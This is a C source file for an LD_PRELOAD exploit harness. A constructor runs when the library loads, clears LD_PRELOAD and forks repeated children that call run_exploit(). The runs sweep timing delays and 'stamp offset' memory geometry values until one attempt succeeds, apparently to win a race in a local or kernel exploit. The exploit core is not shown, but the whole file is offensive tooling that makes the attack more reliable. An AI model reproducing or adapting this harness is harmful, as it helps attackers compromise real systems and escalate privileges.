#include "common.h"

#define DEFAULT_EXPLOIT_ATTEMPTS 16
#define DEFAULT_PSELECT_DELAY_USEC 20000

static int env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

static int attempt_delay_usec(int base_delay, int attempt) {
  static const int offsets[] = {
    0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
  };
  int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
  int delay = base_delay + offsets[(attempt - 1) % count];
  return delay < 0 ? 0 : delay;
}

/* Per-attempt exp32 stamp-offset sweep (opt-in geometry probe).
 * EXP32_STAMP_OFFS="0x58,0x48,0x68,..." — attempt i uses entry
 * (i-1)%n.  Unset/empty = child default (0x58), zero behavior change. */
#define STAMP_OFFS_MAX 16
static unsigned long stamp_offs[STAMP_OFFS_MAX];
static int stamp_offs_n = -1;

static void init_stamp_offs(void) {
  stamp_offs_n = 0;
  const char *e = getenv("EXP32_STAMP_OFFS");
  if (!e || !*e)
    return;
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s", e);
  char *save = NULL;
  for (char *tok = strtok_r(tmp, ",", &save);
       tok && stamp_offs_n < STAMP_OFFS_MAX;
       tok = strtok_r(NULL, ",", &save)) {
    char *end = NULL;
    errno = 0;
    unsigned long v = strtoul(tok, &end, 0);
    if (errno || end == tok || v + 80 > 260)
      continue;
    stamp_offs[stamp_offs_n++] = v;
  }
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  set_unbuffer();

  int max_attempts = env_int(
      "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
  int base_delay = env_int(
      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
  if (getenv("SLIDE_ONLY")) {
    max_attempts = 1;
  }

  unsetenv("LD_PRELOAD");
  char *argv[] = {"preload.so", NULL};

  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d\n",
             getpid(), max_attempts, base_delay);

  init_stamp_offs();

  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    int delay_usec = attempt_delay_usec(base_delay, attempt);
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      char delay[16];
      snprintf(delay, sizeof(delay), "%d", delay_usec);
      SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
      if (stamp_offs_n > 0) {
        char off[16];
        snprintf(off, sizeof(off), "0x%lx",
                 stamp_offs[(attempt - 1) % stamp_offs_n]);
        SYSCHK(setenv("EXP32_STAMP_OFF", off, 1));
      }
      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                 attempt, max_attempts, getpid(), delay_usec);
      _exit(run_exploit(1, argv));
    }

    int status = 0;
    pid_t waited;
    do {
      waited = waitpid(child, &status, 0);
    } while (waited < 0 && errno == EINTR);
    if (waited < 0) {
      pr_error("waitpid attempt=%d pid=%d errno=%d\n",
               attempt, child, errno);
    }
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
      return;
    }

    if (WIFSIGNALED(status)) {
      pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
                 attempt, max_attempts, WTERMSIG(status));
    } else {
      pr_warning("exploit attempt=%d/%d failed status=%d\n",
                 attempt, max_attempts,
                 WIFEXITED(status) ? WEXITSTATUS(status) : status);
    }
  }

  pr_error("exploit failed after %d independent attempts\n", max_attempts);
  _exit(1);
}
